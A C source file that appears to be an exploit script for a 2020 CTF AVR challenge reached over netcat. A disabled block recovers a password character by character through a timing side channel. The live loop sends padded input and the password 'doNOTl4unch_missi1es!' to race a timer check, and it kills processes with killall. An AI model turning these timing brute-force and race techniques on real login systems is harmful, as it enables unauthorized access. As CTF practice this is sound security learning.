#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[1024];

char s[] = "!\"#$\%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~";

int64_t
write_data (FILE * stream, char * pass)
{
    
    fgets(buf, sizeof(buf), stream); //Initialized
        printf("%s", buf);
    fgets(buf, sizeof(buf), stream); //Welcome to secret military database. Press ENTER to continue.
  //      printf("%s", buf);
    fprintf (stream, "\n");
//    bool showOutput = 0;
    int64_t uptime = 0;
    fprintf(stream, "agent\n");
    fprintf(stream, "%s\n",pass);
    fgets(buf, sizeof(buf), stream); //Timer: on.
   // if(showOutput) printf("%s", buf);
    fgets(buf, sizeof(buf), stream); //Uptime: 2241us
    sscanf(buf, "Uptime: %llus",&uptime);
  //  if(showOutput) printf("%s", buf);
    fscanf(stream, "Login:"); //Login:
  //  if(showOutput) printf("Login:\n");
    
    fscanf(stream, "Password:"); //Login:
  //  if(showOutput) printf("Password:\n");
   
    fgets(buf, sizeof(buf), stream);
  //  if(showOutput) printf("%s", buf); // wrong password
  
        fgets(buf, sizeof(buf), stream); //Timer: on.
    //    if(showOutput) printf("%s", buf);
        fgets(buf, sizeof(buf), stream); //Uptime: 2241us
        int64_t up = 0;
        sscanf(buf, "Uptime: %llus",&up);
        int64_t diff = up - uptime;
        uptime = up;
    
    printf("%s %d\n", pass, diff);
    return diff;
}

int
main (void)
{
  FILE *output;

    char pass[30];
    char pass2[30];
    memset(pass, 0, 30);
    memset(pass2, 0, 30);
    strcpy(pass,"doNOTl4unch_missi1es!");
    strcpy(pass2,"doNOTl4unch_missi1es!");
#if 0
    for(int index = 21; index < 29; index++)
    {
        int i = 0;
        char a = s[i];
        int64_t Longest = 0;
        while(1)
        {
            output = popen ("./simduino.elf code.hex", "r+");
            //output = popen("nc avr.2020.ctfcompetition.com 1337", "r+");
            if (!output)
            {
                fprintf (stderr,
                         "fail\n");
                return EXIT_FAILURE;
            }
            strncpy(pass, pass2, index);
            pass[index] = a;
            auto diff = write_data(output, pass);
            if(diff > Longest)
            {
                Longest = diff;
                pass2[index] = a;
                
            }
            
            system("killall simduino.elf");
           // system("killall nc");
            if (pclose (output) != 0)
            {
                //   fprintf (stderr, "Could not run more or other error.\n");
            }
            i++;
            if(i>= sizeof(s))
                break;
            a = s[i];

        }
        strcpy(pass, pass2);
    }
#endif
    for(int z = 0; z < 50; z++)
    {
        for(int i = 165; i < 170; i++)
        {
            //
            
            char extra[400] = {0};
            for(int j = 0; j < i; j++) extra[j] = 'a';
            //output = popen ("./simduino.elf code.hex", "r+");
            output = popen ("nc avr.2020.ctfcompetition.com 1337", "r+");
            fprintf(output, "\nagent\n%s\nagent\ndoNOTl4unch_missi1es!\n",extra);
            for (int i = 0; i < 8; i++)
            {
                fgets(buf, sizeof(buf), output); //Initialized
                printf("%s", buf);
            }
            char state[10];
            fscanf(output,"Timer: %s",state);
            printf("%s\n",state);
            if (0 != strcmp(state,"off."))
            {
                while(1)
                {
                    fprintf(output, "2\n");
                    for (int i = 0; i < 6; i++)
                    {
                        fgets(buf, sizeof(buf), output); //Initialized
                        printf("%s", buf);
                    }
                }
                
            }
            system("killall nc");
            //system("killall simduino.elf");
            pclose (output);
        }
    }
  return EXIT_SUCCESS;
}
